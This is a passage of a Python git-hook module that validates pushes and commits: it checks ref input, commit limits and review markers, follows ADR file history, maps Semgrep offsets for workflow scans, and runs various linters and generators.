    same content named `.ps1` was rejected outright because PowerShell parses a
    whole script before running any of it. The shebang is therefore load-bearing
    for the bypass, and refusing any `#!` body closes it without depending on
    which extension the runner happens to choose. Refs #3663.
    """
    return bool(SHEBANG_RE.match(run))


def _blob_id_at(repo_root: Path, commit: str, path: str) -> str | None:
    result = _run_git(repo_root, ["rev-parse", f"{commit}:{path}"])
    if result.returncode != 0:
        return None
    return result.stdout.strip() or None


def _decoded_frontmatter(raw: bytes) -> str | None:
    """Decode frontmatter strictly, or report that it cannot be reasoned about.

    Frontmatter has to become text to be parsed as YAML. Decoding it lossily
    would let two different field values collide on the replacement character
    and drop out of the changed-key set, hiding an edit the exemption was never
    meant to cover. Bytes YAML could not have meant are a reason to run the
    validator, so this fails closed instead.
    """
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        return None


def _followed_blob_ids(repo_root: Path, path: str, diff_merges: str) -> set[str]:
    """Blob ids from one `--follow` traversal of `path` on `origin/main`.

    Reading ids out of the raw diff rather than re-reading the file at each
    commit is what makes `--follow` useful here: at the older commits the
    current name does not exist yet.

    `diff_merges` is named rather than left to `-m`, which means
    `--diff-merges=on` and takes its format from the user's `log.diffMerges`.
    Set to `combined` or `dense-combined`, a merge prints one `::` record whose
    fourth field is the first parent's pre-image, so the post-image this reads
    would be the wrong blob. What this gate accepts is not a readability
    preference.
    """
    result = _run_git_bytes(
        repo_root,
        [
            "log",
            f"--diff-merges={diff_merges}",
            # `log.showSignature` prefixes each commit's raw records with the
            # verification result, and the first field of the stream then
            # begins with that text rather than the colon a record starts
            # with. Every record is skipped and the walk reports that main
            # carried nothing here, which refuses records main did carry, for
            # whichever developers hold that setting. What this gate accepts
            # is not a display preference.
            "--no-show-signature",
            "--follow",
            "--format=",
            "--raw",
            "--no-abbrev",
            # Paths arrive raw and NUL-separated. Left to the default, git
            # quotes any path outside ASCII or carrying a quote, a backslash
            # or a control character, and the scope test below ends on an
            # anchor the closing quote defeats, so such an ADR would read as
            # having no history. It also stops a tab inside a name from
            # looking like the separator before a second path.
            "-z",
            "origin/main",
            "--",
            path,
        ],
    )
    if result.returncode != 0:
        return set()
    # An unrecognised path carries no identity, so nothing below matches it and
    # the caller is told main has carried nothing here. That refuses; it cannot
    # exempt.
    followed = _governed_document_identity(path)
    blob_ids: set[str] = set()
    # Decoded here rather than by the pipe. A text mode read applies universal
    # newline translation, so a path ending in a carriage return arrives ending
    # in a newline, and the scope test below anchors with `$`, which matches
    # before a trailing newline. A path this gate does not govern then reads as
    # one and its blobs join the carried set, which exempts content that never
    # sat at a governed path. That is what this read fixes. The error handler
    # is `surrogateescape` because it round trips and costs nothing, not
    # because it changes a verdict: identity here is the record's number, so a
    # byte spent elsewhere in the path reaches no decision either way, and a
    # mutation to `replace` survives the suite for that reason.
    fields = result.stdout.decode("utf-8", "surrogateescape").split("\0")
    index = 0
    while index < len(fields):
        record = fields[index]
        index += 1
        if not record.startswith(":") or record.startswith("::"):
            # A `::` record lists one pre-image per parent before the
            # post-image, so its fourth field is a pre-image and its width
            # depends on the parent count. Naming the format should keep these
            # away; skipping them is what keeps that true if one arrives. The
            # paths that follow one fail this same test and are skipped too.
            continue
        metadata = record.split()
        if len(metadata) < 5:
            continue
        # A rename or a copy names a source and then a destination. Every
        # other status names one path.
        wanted = 2 if metadata[4][:1] in ("R", "C") else 1
        paths = fields[index : index + wanted]
        index += wanted
        if len(paths) < wanted:
            break
        if _governed_document_identity(paths[-1]) != followed:
            # `--follow` rewrites the path it tracks whenever it scores a drop
            # and an add as a rename, which is similarity and not provenance.
            # Crossing into a file this gate does not govern would read that
            # file's states as states of this record, and they never faced ADR
            # review; crossing into another record would read a decision
            # somebody reviewed under a different number as this one. The
            # post-image belongs to the record's destination path, so that is
            # the path that has to qualify.
            continue
        blob_ids.add(metadata[3])
    # A deletion names no blob afterwards, and the width of that field follows
    # the repository's hash.
    return {blob_id for blob_id in blob_ids if not _is_zero_sha(blob_id)}


def _frontmatter_pair_for_a_body_unchanged_edit(
    path: str,
    repo_root: Path,
) -> tuple[str, str] | None:
    """Return HEAD and staged frontmatter for an edit that left the body alone.

    `None` means no exemption is on offer: a blob is missing, either document
    has no frontmatter, the bodies differ, or a frontmatter holds bytes UTF-8
    cannot read. Both exemptions ask this same question and differ only in
    which changed fields they will then accept.
    """
    old_blob = _read_head_blob(repo_root, path)
    new_blob = _read_index_blob(repo_root, path)
    if old_blob is None or new_blob is None:
        return None
    old_frontmatter, old_body = _split_frontmatter(old_blob)
    new_frontmatter, new_body = _split_frontmatter(new_blob)
    if not old_frontmatter or not new_frontmatter or old_body != new_body:
        return None
    old_text = _decoded_frontmatter(old_frontmatter)
    new_text = _decoded_frontmatter(new_frontmatter)
    if old_text is None or new_text is None:
        return None
    return old_text, new_text


def _governed_document_identity(path: str) -> str | None:
    """Which record `path` holds, or None if this gate does not govern it.

    Scoping a followed history to governed paths does not tell two decision
    records apart: both are governed. Records written from one template share
    most of their lines, so git reads a commit that drops one and adds another
    as a rename of it, and the walk crosses from one decision into the other.

    The number in the filename is what says which decision a path holds. The
    protocol has no number and stands for itself.
    """
    if ADR_PATH_RE.search(path):
        # Read the number from the final segment, which is where the path test
        # anchors. Across the whole path the first number wins, so a directory
        # named for another record would shadow the one the file holds and two
        # decisions would share one identity.
        identifier = ADR_ID_RE.search(PATH_SEPARATOR_RE.split(path)[-1])
        return _normalized_record_number(identifier.group(0)) if identifier else None
    if SESSION_PROTOCOL_PATH_RE.search(path):
        return "SESSION-PROTOCOL"
    return None


def _normalized_record_number(identifier: str) -> str:
    """One record's number, written the one way, so a repad is not a new record.

    This repo renamed `ADR-0003-...` to `ADR-003-...`. Compared as text those
    are two identities, and the walk stops at the rename between them, which
    refuses states the record plainly held.

    Only the leading zeros go, and they go as text. Reading the number as an
    integer instead would fold two records together twice over: `\\d` matches
    every decimal digit, so a name written in another script is governed too
    and would take the identity of the ASCII record holding the same value,
    and a new file would inherit a real record's reviewed history. Stripping
    zeros anywhere rather than in front would fold `ADR-100` into `ADR-1` the
    same way. Text stripping leaves both pairs distinct.
    """
    prefix, _, number = identifier.upper().partition("-")
    return f"{prefix}-{number.lstrip('0') or '0'}"


def _parse_suppression_renames(
    output: str,
    *,
    context: str = "pushed range",
) -> SuppressionRenames | None:
    records = [record for record in output.split("\0") if record]
    pure_scanned: set[str] = set()
    promoted: set[str] = set()
    index = 0
    while index < len(records):
        status = records[index]
        if index + 2 >= len(records):
            print(f"ERROR: malformed rename status in {context}", file=sys.stderr)
            return None
        source = _safe_relative_path(records[index + 1])
        destination = _safe_relative_path(records[index + 2])
        if source is None or destination is None:
            print(f"ERROR: unsafe rename path in {context}", file=sys.stderr)
            return None
        source_scanned = Path(source).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES
        destination_scanned = Path(destination).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES
        if status == "R100" and source_scanned and destination_scanned:
            pure_scanned.add(destination)
        if not source_scanned and destination_scanned:
            promoted.add(destination)
        index += 3
    return SuppressionRenames(
        pure_scanned_destinations=frozenset(pure_scanned),
        promoted_destinations=frozenset(promoted),
    )


def _suppression_renames(
    repo_root: Path,
    range_spec: str,
    *,
    cached: bool = False,
    context: str = "pushed range",
) -> SuppressionRenames | None:
    args = ["diff"]
    if cached:
        args.append("--cached")
    args.extend(
        (
            *TEXTUAL_DIFF_FLAGS,
            "--find-renames",
            "--name-status",
            "--diff-filter=R",
            "-z",
            range_spec,
        )
    )
    result = _run_git(
        repo_root,
        args,
    )
    if result.returncode != 0:
        _print_process_output(result)
        return None
    return _parse_suppression_renames(result.stdout, context=context)


PATH_SEPARATOR_RE = re.compile(r"[\\/]")


def _step_defeats_bash_subparse(shell: str | None, run: str) -> bool:
    if _body_declares_its_own_interpreter(run):
        return False
    if _is_non_bash_shell(shell):
        return True
    if not ACTIONS_EXPRESSION_RE.search(run):
        return False
    if _splices_expression_into_command_word(run):
        return False
    # An Actions expression explains a Bash sub-parse failure only when the body
    # is otherwise valid shell. Without this check, appending a deliberate syntax
    # error to a malicious script suppresses the finding and the error together.
    return _body_is_valid_shell_syntax(run)


def _utf8_char_index_map(raw: bytes) -> dict[int, int] | None:
    """Map every character-start byte offset in ``raw`` to its character index.

    Built in one linear pass so a caller converting many offsets in the same
    file does not re-decode a prefix per offset. Returns ``None`` when ``raw``
    is not valid UTF-8 as a whole, which sends the caller back to the per-offset
    path that can still resolve offsets inside a decodable prefix.
    """
    try:
        text = raw.decode("utf-8")
    except UnicodeDecodeError:
        return None
    mapping: dict[int, int] = {}
    byte_offset = 0
    for char_index, character in enumerate(text):
        mapping[byte_offset] = char_index
        byte_offset += len(character.encode("utf-8"))
    mapping[byte_offset] = len(text)
    return mapping


def _byte_offset_to_char_index(raw: bytes, offset: int) -> int | None:
    """Convert a Semgrep byte offset into a PyYAML character index.

    Semgrep reports ``start.offset`` and ``end.offset`` in bytes while PyYAML
    exposes ``start_mark.index`` as a character index. The two diverge on any
    file holding multibyte content, so the containment test read the wrong
    region. An offset that lands mid-character returns ``None`` and the caller
    drops the span, which blocks the push. Refs #3672.

    Decoding a fresh prefix per call is quadratic in the file size. Callers
    converting more than one offset from the same file should build the map once
    with :func:`_utf8_char_index_map` instead. Refs #3673.
    """
    if offset < 0 or offset > len(raw):
        return None
    try:
        return len(raw[:offset].decode("utf-8"))
    except UnicodeDecodeError:
        return None


def _powershell_partial_parsing_spans(
    error: dict[object, object],
    message: str,
    target: Path,
    repo_root: Path,
    raw: bytes,
) -> list[tuple[int, int, int, int]]:
    error_type = error.get("type")
    rule_ids = SEMGREP_PARTIAL_RULE_RE.findall(message)
    if (
        error.get("code") != 3
        or not isinstance(error_type, list)
        or len(error_type) != 2
        or error_type[0] != "PartialParsing"
        or len(rule_ids) != 1
        or rule_ids[0] not in SEMGREP_POWERSHELL_RULES
    ):
        return []
    locations = error_type[1]
    if not isinstance(locations, list):
        return []
    # One pass over the file, not one decode per offset. Semgrep can report many
    # locations for a single PartialParsing error, and each conversion used to
    # re-decode the whole prefix. Refs #3673.
    char_index_map = _utf8_char_index_map(raw)
    spans: list[tuple[int, int, int, int]] = []
    for location in locations:
        if not isinstance(location, dict):
            return []
        location_path = location.get("path")
        start = location.get("start")
        end = location.get("end")
        if (
            not isinstance(location_path, str)
            or _resolved_target_path(location_path, repo_root) != target
            or not isinstance(start, dict)
            or not isinstance(end, dict)
        ):
            return []
        start_line = start.get("line")
        start_col = start.get("col")
        start_offset = start.get("offset")
        end_line = end.get("line")
        end_col = end.get("col")
        end_offset = end.get("offset")
        positions = (
            start_line,
            start_col,
            start_offset,
            end_line,
            end_col,
            end_offset,
        )
        if any(type(position) is not int for position in positions):
            return []
        (
            start_line,
            start_col,
            start_offset,
            end_line,
            end_col,
            end_offset,
        ) = (cast(int, position) for position in positions)
        if (
            start_line < 1
            or start_col < 1
            or start_offset < 0
            or end_line < start_line
            or end_col < 1
            or end_offset <= start_offset
            or (end_line == start_line and end_col < start_col)
        ):
            return []
        if char_index_map is None:
            start_index = _byte_offset_to_char_index(raw, start_offset)
            end_index = _byte_offset_to_char_index(raw, end_offset)
        else:
            start_index = char_index_map.get(start_offset)
            end_index = char_index_map.get(end_offset)
        if start_index is None or end_index is None:
            return []
        spans.append((start_line, end_line, start_index, end_index))
    return spans


def _span_belongs_to_unparseable_step(
    scripts: Sequence[tuple[str | None, str, ScalarNode]],
    span: tuple[int, int, int, int],
) -> bool:
    start_line, end_line, start_offset, end_offset = span
    matching_steps = [
        (shell, run)
        for shell, run, node in scripts
        if _yaml_node_contains_span(
            node,
            start_line,
            end_line,
            start_offset,
            end_offset,
        )
    ]
    return bool(matching_steps) and all(
        _step_defeats_bash_subparse(shell, run) for shell, run in matching_steps
    )


def _yaml_node_contains_span(
    node: ScalarNode,
    start_line: int,
    end_line: int,
    start_offset: int,
    end_offset: int,
) -> bool:
    node_start_line = int(node.start_mark.line) + 1
    node_end_line = int(node.end_mark.line) + 1
    node_end_column = int(node.end_mark.column)
    node_start_offset = int(node.start_mark.index)
    node_end_offset = int(node.end_mark.index)
    node_last_line = node_end_line if node_end_column > 0 else node_end_line - 1
    lines_contained = node_start_line <= start_line <= end_line <= node_last_line
    return lines_contained and node_start_offset <= start_offset and end_offset <= node_end_offset


def _resolved_target_path(path: str, repo_root: Path) -> Path:
    candidate = Path(path)
    if not candidate.is_absolute():
        candidate = repo_root / candidate
    return candidate.resolve(strict=False)


def _semgrep_target_failure(
    result: subprocess.CompletedProcess[str],
    message: str,
) -> subprocess.CompletedProcess[str]:
    stderr = f"{result.stderr.rstrip()}\nERROR: {message}\n".lstrip()
    return subprocess.CompletedProcess(result.args, 2, result.stdout, stderr)


def run_semgrep(repo_root: Path) -> int:
    result = _run_command(
        [
            sys.executable,
            "scripts/security/run_semgrep.py",
            "--config",
            "auto",
            "--severity",
            "error",
        ],
        repo_root,
        timeout_seconds=SEMGREP_TIMEOUT_SECONDS,
    )
    _print_process_output(result)
    return result.returncode


def parse_push_refs(stream: TextIO) -> list[PushRef]:
    refs: list[PushRef] = []
    for line_number, line in enumerate(stream, start=1):
        fields = line.split()
        if len(fields) != 4:
            raise ValueError(f"line {line_number}: expected four pre-push fields")
        push_ref = PushRef(*fields)
        _validate_push_ref(push_ref, line_number)
        refs.append(push_ref)
    return refs


def _validate_push_ref(push_ref: PushRef, line_number: int) -> None:
    for sha in (push_ref.local_sha, push_ref.remote_sha):
        if not is_full_object_id(sha):
            raise ValueError(f"line {line_number}: invalid object id")
    for ref in (push_ref.local_ref, push_ref.remote_ref):
        if ref.startswith("-") or any(char.isspace() for char in ref):
            raise ValueError(f"line {line_number}: invalid ref name")


def _is_zero_sha(sha: str) -> bool:
    return len(sha) in ZERO_SHA_LENGTHS and not sha.strip("0")


def _merge_base(repo_root: Path, base: str, head: str) -> str | None:
    result = _run_git(repo_root, ["merge-base", base, head])
    if result.returncode != 0:
        return None
    return result.stdout.strip() or None


def _commit_ref_exists(repo_root: Path, ref: str) -> bool:
    result = _run_git(repo_root, ["rev-parse", "--verify", "--quiet", f"{ref}^{{commit}}"])
    return result.returncode == 0


def _is_shallow_repository(repo_root: Path) -> bool | None:
    result = _run_git(repo_root, ["rev-parse", "--is-shallow-repository"])
    if result.returncode != 0:
        return None
    value = result.stdout.strip().lower()
    if value == "true":
        return True
    if value == "false":
        return False
    return None


def _empty_tree_sha(repo_root: Path) -> str | None:
    result = _run_command(
        ["git", "-C", str(repo_root), "hash-object", "-t", "tree", "--stdin"],
        repo_root,
        input_text="",
    )
    if result.returncode == 0:
        return result.stdout.strip() or None
    return None


def resolve_push_update(push_ref: PushRef, repo_root: Path) -> PushUpdate:
    if push_ref.is_deletion:
        raise ValueError("deletions do not have a push range")
    base = _merge_base(repo_root, "origin/main", push_ref.local_sha)
    if base is None and push_ref.is_new:
        base = _merge_base(repo_root, "main", push_ref.local_sha)
        if base is None:
            base_refs_present = any(
                _commit_ref_exists(repo_root, base_ref) for base_ref in ("origin/main", "main")
            )
            if base_refs_present and _is_shallow_repository(repo_root) is False:
                base = _empty_tree_sha(repo_root) or EMPTY_TREE_SHA1
    if base is None and not push_ref.is_new:
        base = push_ref.remote_sha
    if base is None:
        raise PushUpdateConfigError(
            "could not determine push base for new branch; fetch origin/main or "
            "unshallow the repository before pushing"
        )
    range_spec = f"{base}..{push_ref.local_sha}"
    destination = _branch_name(push_ref.remote_ref)
    return PushUpdate(
        source=push_ref,
        base=base,
        head=push_ref.local_sha,
        range_spec=range_spec,
        destination_branch=destination,
    )


def _branch_name(ref: str) -> str | None:
    prefix = "refs/heads/"
    return ref[len(prefix) :] if ref.startswith(prefix) else None


def _fetch_origin_main(repo_root: Path) -> None:
    result = _run_git(repo_root, ["fetch", "--no-tags", "--quiet", "origin", "main"])
    if result.returncode != 0:
        print("WARNING: could not refresh origin/main; using local ref", file=sys.stderr)


def _protected_push_destination(push_ref: PushRef) -> str | None:
    branch = _branch_name(push_ref.remote_ref)
    return branch if branch in {"main", "master"} else None


def check_push_refs(stream: TextIO, repo_root: Path) -> int:
    active_operation_result = check_active_git_operation(repo_root)
    if active_operation_result != 0:
        return active_operation_result
    branch_result = check_branch(repo_root)
    if branch_result != 0:
        return branch_result
    history_result = _check_history_integrity(repo_root)
    if history_result != 0:
        return history_result
    try:
        refs = parse_push_refs(stream)
    except ValueError as error:
        print(f"ERROR: malformed pre-push input, {error}", file=sys.stderr)
        return 2
    protected = next(
        (branch for ref in refs if (branch := _protected_push_destination(ref))),
        None,
    )
    if protected is not None:
        print(f"ERROR: cannot delete or update protected branch '{protected}'", file=sys.stderr)
        return 1
    active_refs = [push_ref for push_ref in refs if not push_ref.is_deletion]
    if active_refs:
        warn_if_push_files_incomplete(active_refs, repo_root)
        _fetch_origin_main(repo_root)
    updates = []
    for push_ref in active_refs:
        try:
            updates.append(resolve_push_update(push_ref, repo_root))
        except PushUpdateConfigError as error:
            print(f"ERROR: {error}", file=sys.stderr)
            return 2
    return _check_push_updates(updates, repo_root)


def warn_if_push_files_incomplete(
    push_refs: Sequence[PushRef],
    repo_root: Path,
) -> None:
    """Warn when Lefthook cannot prove its file template matches the push."""
    head_result = _run_git(repo_root, ["rev-parse", "HEAD"])
    if head_result.returncode != 0:
        _print_process_output(head_result)
        print(
            "WARNING: could not compare pushed refs with checked-out HEAD; "
            "Lefthook {push_files} quality coverage is unknown",
            file=sys.stderr,
        )
        return
    checked_out_head = head_result.stdout.strip()
    push_base = _run_git(repo_root, ["rev-parse", "--verify", "@{push}"])
    if (
        len(push_refs) == 1
        and push_refs[0].local_sha == checked_out_head
        and push_base.returncode == 0
        and push_refs[0].remote_sha == push_base.stdout.strip()
    ):
        return
    print(
        "WARNING: Lefthook {push_files} quality coverage may be incomplete because "
        "the pushed ref set does not match checked-out HEAD and its configured push "
        "base. Every ref still receives immutable security and policy scans. Push "
        "each ref from its checked-out branch for full local quality validation.",
        file=sys.stderr,
    )


def _check_push_updates(updates: Sequence[PushUpdate], repo_root: Path) -> int:
    policy_failed = False
    config_failed = False
    for update in updates:
        destination = update.destination_branch
        if destination in {"main", "master"}:
            print(f"ERROR: cannot push directly to '{destination}'", file=sys.stderr)
            policy_failed = True
        count_result = _check_commit_limit(update, repo_root)
        marker_result = _check_review_marker(update, repo_root)
        plugin_result = _check_plugin_version(update, repo_root)
        policy_failed |= count_result == 1 or marker_result == 1 or plugin_result == 1
        config_failed |= count_result == 2 or marker_result == 2
    if policy_failed:
        return 1
    return 2 if config_failed else 0


def _contains_main_merge(update: PushUpdate, repo_root: Path) -> bool:
    result = _run_git(repo_root, ["rev-list", "--merges", update.range_spec])
    if result.returncode != 0:
        return False
    merges = [merge_sha for merge_sha in result.stdout.splitlines() if merge_sha]
    if not merges:
        return False
    # Every merge is read against the same trunk, and a push may carry many.
    # Reading it here keeps the walk once per push rather than once per merge.
    # main_first_parent_shas is the shared implementation; contains_main_merge
    # in pr_commit_count uses it too so both gates use the same predicate. This
    # module's _run_git goes with it so a hook keeps the scrubbed git env and
    # the timeout it applies to every other git call it makes.
    trunk = main_first_parent_shas(repo_root, run_git=_run_git)
    return any(_merge_has_main_parent(merge_sha, repo_root, trunk) for merge_sha in merges)


def _merge_has_main_parent(
    merge_sha: str,
    repo_root: Path,
    trunk: frozenset[str] | None = None,
) -> bool:
    # `log.showSignature` makes `show` report the signature check before the
    # commit, and the first field of the split is then a word of that report
    # rather than the merge's own first parent. Skipping the first field would
    # then leave the first parent in the parents searched for main, and a merge
    # of a side branch would read as a merge of main and double the commit
    # limit. What this gate accepts is not a display preference.
    result = _run_git(
        repo_root,
        ["show", "-s", "--no-show-signature", "--format=%P", merge_sha],
    )
    if result.returncode != 0:
        return False
    parents = result.stdout.split()[1:]
    if trunk is None:
        trunk = main_first_parent_shas(repo_root, run_git=_run_git)
    return any(parent in trunk for parent in parents)


def _unpushed_commit_count(update: PushUpdate, repo_root: Path) -> int | None:
    """Count commits in the push that no *other* remote branch already carries.

    Issue #3610: the ceiling's only relief is a `commit-limit-bypass` label on an
    open PR, and a first push has no PR to label, so a stacked branch deadlocks.
    A third-level branch inherits its two ancestors' commits even though those
    commits belong to their own PRs and already passed this gate.

    The branch's own remote ref is deliberately kept in the count. Excluding it
    would make every re-push measure only the newest commits, which would retire
    the ceiling entirely for any branch pushed more than once.
    """
    branch = update.destination_branch or _branch_name(update.source.local_ref)
    argv = ["rev-list", "--count", update.source.local_sha, "--not"]
    if branch:
        argv.append(f"--exclude=origin/{branch}")
    argv.append("--remotes=origin")
    result = _run_git(repo_root, argv)
    if result.returncode != 0:
        return None
    try:
        return int(result.stdout.strip())
    except ValueError:
        return None


def _check_commit_limit(update: PushUpdate, repo_root: Path) -> int:
    result = _run_git(repo_root, ["rev-list", "--count", update.range_spec])
    if result.returncode != 0:
        _print_process_output(result)
        return 2
    try:
        commit_count = int(result.stdout.strip())
    except ValueError:
        return 2
    limit = (
        MAIN_MERGE_BLOCK_THRESHOLD if _contains_main_merge(update, repo_root) else BLOCK_THRESHOLD
    )
    if commit_count <= limit:
        return 0
    branch = update.destination_branch or _branch_name(update.source.local_ref)
    args = [sys.executable, "scripts/validation/check_pr_bypass_label.py"]
    if branch:
        args.extend(["--branch", branch])
    bypass = _run_command(args, repo_root)
    if bypass.returncode == 0:
        print(bypass.stdout, end="")
        return 0
    unpushed = _unpushed_commit_count(update, repo_root)
    if unpushed is not None and unpushed <= limit:
        print(
            f"NOTE: push has {commit_count} commits from origin/main, but only "
            f"{unpushed} are not already carried by another pushed branch; "
            f"limit is {limit}.",
        )
        return 0
    _print_process_output(bypass, stdout_stream=sys.stderr)
    print(f"ERROR: push has {commit_count} commits, limit is {limit}", file=sys.stderr)
    return 1


def _check_review_marker(update: PushUpdate, repo_root: Path) -> int:
    trailers = _run_git(
        repo_root,
        [
            "log",
            "-1",
            "--format=%(trailers:key=Reviewed-By,valueonly,unfold)",
            update.head,
        ],
    )
    if trailers.returncode != 0:
        _print_process_output(trailers)
        return 2
    if not any(line.startswith("/review@") for line in trailers.stdout.splitlines()):
        return 0
    result = _run_command(
        [
            sys.executable,
            "scripts/validation/validate_review_marker.py",
            "--ref",
            update.head,
            "--repo-root",
            str(repo_root),
        ],
        repo_root,
    )
    if result.returncode != 0:
        _print_process_output(result)
    return result.returncode


def _check_plugin_version(update: PushUpdate, repo_root: Path) -> int:
    result = _run_command(
        [
            sys.executable,
            "build/scripts/validate_plugin_version_bump.py",
            "--base",
            update.base,
            "--head",
            update.head,
            "--repo-root",
            str(repo_root),
        ],
        repo_root,
    )
    if result.returncode == 2:
        _print_advisory_failure("plugin version check", result)
        return 0
    if result.returncode != 0:
        _print_process_output(result)
    return result.returncode


def run_yamllint(paths: Sequence[str], repo_root: Path) -> int:
    if os.environ.get("SKIP_YAMLLINT") == "1":
        print("YAML lint skipped (SKIP_YAMLLINT=1)")
        return 0
    if not paths:
        return 0
    try:
        result = _run_command(["yamllint", "-f", "parsable", "--", *paths], repo_root)
    except FileNotFoundError:
        print("WARNING: yamllint not installed", file=sys.stderr)
        return 0
    _print_process_output(result)
    if result.returncode != 0:
        print("WARNING: YAML style findings are advisory", file=sys.stderr)
    return 0


def run_skillforge(paths: Sequence[str], repo_root: Path) -> int:
    failed = False
    for path in paths:
        if _skip_skillforge_path(path):
            continue
        if _is_skill_frontmatter_only_change(path, repo_root):
            continue
        result = _run_command(
            [
                sys.executable,
                ".claude/skills/SkillForge/scripts/validate-skill.py",
                Path(path).parent.as_posix(),
            ],
            repo_root,
        )
        _print_process_output(result)
        failed |= result.returncode != 0
    return 1 if failed else 0


def _skip_skillforge_path(path: str) -> bool:
    if path.startswith("evals/"):
        return True
    command_mirrors = {
        "spec",
        "plan",
        "build",
        "test",
        "ship",
        "checkpoint",
        "pr-review",
        "retro",
        "sync",
    }
    parts = PurePosixPath(path).parts
    return (
        len(parts) == 5
        and parts[:3] == ("src", "copilot-cli", "skills")
        and parts[3] in command_mirrors
        and parts[4] == "SKILL.md"
    )


def run_planning_advisory(repo_root: Path) -> int:
    result = _run_command(
        [
            sys.executable,
            "build/scripts/validate_planning_artifacts.py",
            "--path",
            str(repo_root),
        ],
        repo_root,
    )
    _print_process_output(result)
    if result.returncode != 0:
        print("WARNING: planning validation findings are advisory", file=sys.stderr)
    return 0


def run_taste_advisory(paths: Sequence[str], repo_root: Path) -> int:
    """Report taste-lint findings locally; block only when the lint cannot run.

    Findings never block. A lint that failed to produce findings does, because
    "no findings" and "no scan" are indistinguishable to the caller otherwise.
    Local scope is the staged set, so a contributor who touches one line of a
    900-line file would be blocked for a size violation they did not create.
    That is the "inherit latent debt on contact" failure issue #2993 recorded
    for ruff, and it is why enforcement lives in CI as a whole-tree ratchet
    (scripts/ci/taste_count_ratchet.py, issue #3779) instead of here.

    Advisory covers findings, not failures. taste_lints.py exits 10 for
    violations and 1 for a script error; treating both as "advisory findings"
    meant a linter that crashed reported the same thing as a clean run, and the
    CI ratchet would then be the first thing to notice. A crash is surfaced.
    """
    if not paths:
        return 0
    result = _run_command(
        [
            sys.executable,
            ".claude/skills/taste-lints/scripts/taste_lints.py",
            *paths,
        ],
        repo_root,
    )
    _print_process_output(result)
    if result.returncode == _TASTE_LINT_EXIT_VIOLATIONS:
        print("WARNING: taste lint findings are advisory", file=sys.stderr)
        return 0
    if result.returncode != 0:
        print(
            f"ERROR: taste-lints exited {result.returncode}, which is not a scan "
            f"result. The lint did not run, so nothing was checked.",
            file=sys.stderr,
        )
        return 2
    return 0


def generate_mcp_advisory(repo_root: Path) -> int:
    if check_generated_paths("mcp", repo_root) != 0:
        return 2
    result = _run_command(
        [
            sys.executable,
            "scripts/sync_mcp_config.py",
            "--sync-all",
            "--repo-root-override",
            str(repo_root),
        ],
        repo_root,
    )
    _print_process_output(result)
    if result.returncode != 0:
        print("ERROR: MCP generation failed; generated files were not staged", file=sys.stderr)
    return result.returncode


def generate_agents_advisory(repo_root: Path) -> int:
    if check_generated_paths("agents", repo_root) != 0:
        return 2
    result = _run_command([sys.executable, "build/generate_agents.py"], repo_root)
    _print_process_output(result)
    if result.returncode != 0:
        print("ERROR: agent generation failed; generated files were not staged", file=sys.stderr)
    return result.returncode


def update_memory_tokens(repo_root: Path) -> int:
    if check_generated_paths("memory-index", repo_root) != 0:
        return 2
    result = _run_command(
        [sys.executable, "scripts/update_memory_index_tokens.py"],
        repo_root,
    )
    _print_process_output(result)
    if result.returncode != 0:
        print("ERROR: memory token update failed; memory index was not staged", file=sys.stderr)
    return result.returncode


def validate_memory_sizes(repo_root: Path) -> int:
    validator = repo_root / ".claude/skills/memory/scripts/test_memory_size.py"
    if not validator.is_file() or validator.is_symlink():
        print(f"ERROR: unsafe or missing memory size validator: {validator}", file=sys.stderr)
        return 2

    new_paths = _staged_memory_paths(repo_root, "A")
    modified_paths = _staged_memory_paths(repo_root, "M")
    if new_paths is None or modified_paths is None:
        return 2

    new_failures = _validate_memory_path_set(
        new_paths,
        validator,
        repo_root,
        blocking=True,
    )
    _validate_memory_path_set(
        modified_paths,
        validator,
        repo_root,
        blocking=False,
    )
    return 1 if new_failures else 0


def _staged_memory_paths(repo_root: Path, diff_filter: str) -> list[str] | None:
    result = _run_git(
        repo_root,
        [
            "diff",
            "--cached",
            "--name-only",
            "-z",
            f"--diff-filter={diff_filter}",
            "--",
            ".serena/memories",
        ],
    )
    if result.returncode != 0:
        _print_process_output(result)
        return None
    paths: list[str] = []
    for raw_path in result.stdout.split("\0"):
        if not raw_path:
            continue
        path = _safe_relative_path(raw_path)
        if path is None or not path.endswith(".md"):
            print(f"ERROR: unsafe staged memory path: {raw_path}", file=sys.stderr)
            return None
        paths.append(path)
    return paths


def _validate_memory_path_set(
    paths: Sequence[str],
    validator: Path,
    repo_root: Path,
    *,
    blocking: bool,
) -> bool:
    failed = False
    for path in paths:
        memory_path = _safe_output_path(repo_root, path)
        if memory_path is None or not memory_path.is_file():
            print(f"ERROR: unsafe staged memory file: {path}", file=sys.stderr)
            failed = True
            continue
        result = _run_command(
            [sys.executable, str(validator), str(memory_path)],
            repo_root,
        )
        if result.returncode == 0:
            continue
        _print_process_output(result)
        label = "ERROR" if blocking else "WARNING"
        print(f"{label}: memory exceeds size thresholds: {path}", file=sys.stderr)
        failed = True
    return failed


def cross_reference_memories(paths: Sequence[str], repo_root: Path) -> int:
    if check_generated_paths("memory", repo_root) != 0:
        return 2
    result = _run_command(
        [
            sys.executable,
            ".claude/skills/memory/scripts/invoke_memory_cross_reference.py",
            "--files",
            *paths,
            "--output-json",
        ],
        repo_root,
    )
    _print_process_output(result)
    if result.returncode != 0:
        print(
            "ERROR: memory cross-reference failed; generated files were not staged",
            file=sys.stderr,
        )
        return result.returncode
    try:
        payload = json.loads(result.stdout)
    except json.JSONDecodeError as error:
        print(f"ERROR: invalid memory cross-reference result: {error}", file=sys.stderr)
        return 2
    if payload.get("Success") is not True:
        print(
            "ERROR: memory cross-reference reported errors; generated files were not staged",
            file=sys.stderr,
        )
        return 1
    return 0


def run_memory_sync(repo_root: Path) -> int:
    if os.environ.get("SKIP_MEMORY_SYNC") == "1":
        print("Memory sync skipped (SKIP_MEMORY_SYNC=1)")
        return 0
    command = [sys.executable, "-m", "scripts.memory_sync.cli", "hook"]
    if os.environ.get("MEMORY_SYNC_IMMEDIATE") == "1":
        command.append("--immediate")
    result = _run_command(command, repo_root)
    _print_process_output(result)
    if result.returncode != 0:
        print("WARNING: memory sync failed without blocking", file=sys.stderr)
    return 0


def _pytest_commands(repo_root: Path) -> list[list[str]]:
    safe_push_tests = repo_root / "tests" / "test_safe_push_pr_branch.py"
    return [
        [
            sys.executable,
            "-m",
            "pytest",
            "-m",
            "not integration",
            str(repo_root / "tests"),
            "--ignore",
